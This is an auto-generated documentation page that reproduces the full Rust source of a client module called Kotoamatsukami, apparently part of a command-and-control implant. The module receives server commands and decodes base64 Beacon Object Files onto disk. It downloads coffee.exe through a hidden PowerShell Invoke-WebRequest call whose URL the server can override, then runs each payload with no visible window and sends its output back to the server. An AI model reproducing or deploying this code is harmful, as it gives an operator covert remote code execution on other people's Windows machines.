# Kotoamatsukami (別天津神) — BOF execution engine (client side).

| Field | Value |
|-------|-------|
| **Source** | `src/client_rust/src/kotoamatsukami.rs` |
| **Lines** | 315 |
| **Cards** | T023-client-capabilities |
| **Role** | Advanced manipulation module |

## Purpose

Kotoamatsukami (別天津神) — BOF execution engine (client side).

Loads and executes Beacon Object Files via coffee:
https://github.com/hakaioffsec/coffee

Message types (client → server):
0x50 MSG_KOTOAMATSUKAMI_OUTPUT: JSON {job_id, stdout, exit_code, error?}

Commands received (server → client via MSG_COMMAND):
KOTOAMATSUKAMI_EXEC   {job_id, bof_name, bof_b64, args: [{type, value}], coffee_url?}
KOTOAMATSUKAMI_CANCEL {job_id}

## Constants

- `MSG_KOTOAMATSUKAMI_OUTPUT`: `u8` = `0x50`

## Types

### struct `ExecRequest` (line 49)

### struct `BofArg` (line 59)

### struct `CancelRequest` (line 66)

### struct `OutputMessage` (line 71)

## Internal Functions

- `cancelled` (line 26)
- `mark_cancelled` (line 30)
- `is_cancelled` (line 36)
- `clear_cancelled` (line 40)
- `coffee_path` — Returns the path to coffee.exe — downloads if not present. (line 95)
- `write_bof` — Write the BOF .o file to a temp path. (line 127)
- `build_args` — Build coffee argument flags from the args array. (line 147)
- `build_output_msg` (line 281)

## Key Dependencies

- `use serde::{Deserialize, Serialize};`
- `use tracing::{error, info, warn};`
- `use super::*;`
- `use base64::{engine::general_purpose, Engine as _};`
- `use super::*;`

## Full Source

```rust
//! Kotoamatsukami (別天津神) — BOF execution engine (client side).
//!
//! Loads and executes Beacon Object Files via coffee:
//!   https://github.com/hakaioffsec/coffee
//!
//! Message types (client → server):
//!   0x50 MSG_KOTOAMATSUKAMI_OUTPUT: JSON {job_id, stdout, exit_code, error?}
//!
//! Commands received (server → client via MSG_COMMAND):
//!   KOTOAMATSUKAMI_EXEC   {job_id, bof_name, bof_b64, args: [{type, value}], coffee_url?}
//!   KOTOAMATSUKAMI_CANCEL {job_id}

use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::sync::{Mutex, OnceLock};
use tracing::{error, info, warn};

// ── Protocol constant ─────────────────────────────────────────────────────────

pub const MSG_KOTOAMATSUKAMI_OUTPUT: u8 = 0x50;

// ── Cancel registry ──────────────────────────────────────────────────────────

static CANCELLED: OnceLock<Mutex<HashSet<u32>>> = OnceLock::new();

fn cancelled() -> &'static Mutex<HashSet<u32>> {
    CANCELLED.get_or_init(|| Mutex::new(HashSet::new()))
}

fn mark_cancelled(job_id: u32) {
    if let Ok(mut set) = cancelled().lock() {
        set.insert(job_id);
    }
}

fn is_cancelled(job_id: u32) -> bool {
    cancelled().lock().map(|s| s.contains(&job_id)).unwrap_or(false)
}

fn clear_cancelled(job_id: u32) {
    if let Ok(mut set) = cancelled().lock() {
        set.remove(&job_id);
    }
}

// ── Request / Response structs ────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
pub struct ExecRequest {
    pub job_id: u32,
    pub bof_name: String,
    pub bof_b64: String,
    #[serde(default)]
    pub args: Vec<BofArg>,
    pub coffee_url: Option<String>,
}

#[derive(Debug, Deserialize, Clone)]
pub struct BofArg {
    #[serde(rename = "type")]
    pub arg_type: String,   // "str" | "wstr" | "int" | "short" | "bin"
    pub value: serde_json::Value,
}

#[derive(Debug, Deserialize)]
pub struct CancelRequest {
    pub job_id: u32,
}

#[derive(Debug, Serialize)]
pub struct OutputMessage {
    pub job_id: u32,
    pub stdout: String,
    pub exit_code: Option<i32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

// ── Windows-only implementation ───────────────────────────────────────────────

#[cfg(windows)]
mod win {
    use super::*;
    use base64::{engine::general_purpose, Engine as _};
    use std::fs;
    use std::io::Write;
    use std::path::PathBuf;
    use std::process::Command;

    /// Default coffee.exe download URL (from hakaioffsec releases).
    const COFFEE_DEFAULT_URL: &str =
        "https://github.com/hakaioffsec/coffee/releases/latest/download/coffee-x86_64-pc-windows-msvc.exe";

    /// Returns the path to coffee.exe — downloads if not present.
    fn coffee_path(override_url: Option<&str>) -> Result<PathBuf, String> {
        let temp = std::env::temp_dir().join("raven_bof");
        fs::create_dir_all(&temp).map_err(|e| format!("mkdir: {e}"))?;
        let coffee = temp.join("coffee.exe");
        if coffee.exists() {
            return Ok(coffee);
        }

        let url = override_url.unwrap_or(COFFEE_DEFAULT_URL);
        info!("Kotoamatsukami: downloading coffee from {url}");

        // Use PowerShell as a fallback download mechanism (no external deps)
        let status = Command::new("powershell")
            .args([
                "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
                &format!(
                    "[Net.ServicePointManager]::SecurityProtocol = 'Tls12'; \
                     Invoke-WebRequest -Uri '{url}' -OutFile '{}'",
                    coffee.display()
                ),
            ])
            .status()
            .map_err(|e| format!("powershell spawn: {e}"))?;

        if !status.success() || !coffee.exists() {
            return Err(format!("Failed to download coffee.exe from {url}"));
        }
        info!("Kotoamatsukami: coffee downloaded to {}", coffee.display());
        Ok(coffee)
    }

    /// Write the BOF .o file to a temp path.
    fn write_bof(bof_b64: &str, bof_name: &str) -> Result<PathBuf, String> {
        let bytes = general_purpose::STANDARD
            .decode(bof_b64)
            .map_err(|e| format!("base64 decode: {e}"))?;

        let safe_name = bof_name
            .chars()
            .map(|c| if c.is_alphanumeric() || c == '_' || c == '-' { c } else { '_' })
            .collect::<String>();

        let path = std::env::temp_dir()
            .join("raven_bof")
            .join(format!("{safe_name}.o"));

        fs::write(&path, &bytes).map_err(|e| format!("write bof: {e}"))?;
        Ok(path)
    }

    /// Build coffee argument flags from the args array.
    /// coffee format: -a <type>:<value> [<type>:<value> ...]
    fn build_args(args: &[BofArg]) -> Vec<String> {
        let mut result = Vec::new();
        if args.is_empty() {
            return result;
        }
        result.push("-a".to_string());
        for arg in args {
            let val = match arg.arg_type.as_str() {
                "int" | "short" => arg.value.to_string(),
                "bin" => arg.value.as_str().unwrap_or("").to_string(),
                _ => arg.value.as_str().unwrap_or("").to_string(),
            };
            result.push(format!("{}:{val}", arg.arg_type));
        }
        result
    }

    pub async fn exec(req: ExecRequest) -> OutputMessage {
        let job_id = req.job_id;
        clear_cancelled(job_id);

        info!(
            "Kotoamatsukami EXEC: job={job_id} bof={} args={}",
            req.bof_name,
            req.args.len()
        );

        // Download coffee.exe if needed
        let coffee = match coffee_path(req.coffee_url.as_deref()) {
            Ok(p) => p,
            Err(e) => {
                error!("Kotoamatsukami: coffee unavailable: {e}");
                return OutputMessage {
                    job_id,
                    stdout: String::new(),
                    exit_code: None,
                    error: Some(format!("coffee not available: {e}")),
                };
            }
        };

        if is_cancelled(job_id) {
            return OutputMessage {
                job_id,
                stdout: String::new(),
                exit_code: None,
                error: Some("cancelled".to_string()),
            };
        }

        // Write BOF to disk
        let bof_path = match write_bof(&req.bof_b64, &req.bof_name) {
            Ok(p) => p,
            Err(e) => {
                return OutputMessage {
                    job_id,
                    stdout: String::new(),
                    exit_code: None,
                    error: Some(format!("write bof: {e}")),
                };
            }
        };

        // Build command: coffee.exe -f <bof.o> [-a <args...>]
        let mut cmd = Command::new(&coffee);
        cmd.arg("-f").arg(&bof_path);
        for arg_flag in build_args(&req.args) {
            cmd.arg(arg_flag);
        }
        cmd.stdout(std::process::Stdio::piped());
        cmd.stderr(std::process::Stdio::piped());

        // Use CREATE_NO_WINDOW on Windows to avoid popup
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
        }

        let output = match cmd.output() {
            Ok(o) => o,
            Err(e) => {
                let _ = fs::remove_file(&bof_path);
                return OutputMessage {
                    job_id,
                    stdout: String::new(),
                    exit_code: None,
                    error: Some(format!("spawn coffee: {e}")),
                };
            }
        };

        let _ = fs::remove_file(&bof_path);

        let mut stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
        if !stderr.is_empty() {
            stdout.push_str("\n[stderr]\n");
            stdout.push_str(&stderr);
        }

        let exit_code = output.status.code();
        info!("Kotoamatsukami: job={job_id} exit={exit_code:?} output_len={}", stdout.len());

        OutputMessage {
            job_id,
            stdout,
            exit_code,
            error: if output.status.success() { None } else {
                Some(format!("coffee exited {}", exit_code.unwrap_or(-1)))
            },
        }
    }
}

// ── Non-Windows stubs ─────────────────────────────────────────────────────────

#[cfg(not(windows))]
mod win {
    use super::*;

    pub async fn exec(req: ExecRequest) -> OutputMessage {
        warn!("Kotoamatsukami: BOF execution is Windows-only (job={})", req.job_id);
        OutputMessage {
            job_id: req.job_id,
            stdout: String::new(),
            exit_code: None,
            error: Some("BOF execution requires Windows".to_string()),
        }
    }
}

// ── Public dispatch ───────────────────────────────────────────────────────────

fn build_output_msg(out: &OutputMessage) -> Vec<u8> {
    let json = serde_json::to_vec(out).unwrap_or_default();
    let mut msg = vec![MSG_KOTOAMATSUKAMI_OUTPUT];
    msg.extend_from_slice(&(json.len() as u32).to_be_bytes());
    msg.extend_from_slice(&json);
    msg
}

/// Dispatch KOTOAMATSUKAMI_* commands (called from main.rs).
pub async fn dispatch(cmd_type: &str, payload: &str) -> Vec<Vec<u8>> {
    match cmd_type {
        "KOTOAMATSUKAMI_EXEC" => {
            let req: ExecRequest = match serde_json::from_str(payload) {
                Ok(r) => r,
                Err(e) => {
                    error!("Kotoamatsukami: bad EXEC payload: {e}");
                    return vec![];
                }
            };
            let out = win::exec(req).await;
            vec![build_output_msg(&out)]
        }
        "KOTOAMATSUKAMI_CANCEL" => {
            if let Ok(req) = serde_json::from_str::<CancelRequest>(payload) {
                mark_cancelled(req.job_id);
                info!("Kotoamatsukami: job {} marked cancelled", req.job_id);
            }
            vec![]
        }
        _ => {
            warn!("Kotoamatsukami: unknown command {cmd_type}");
            vec![]
        }
    }
}

```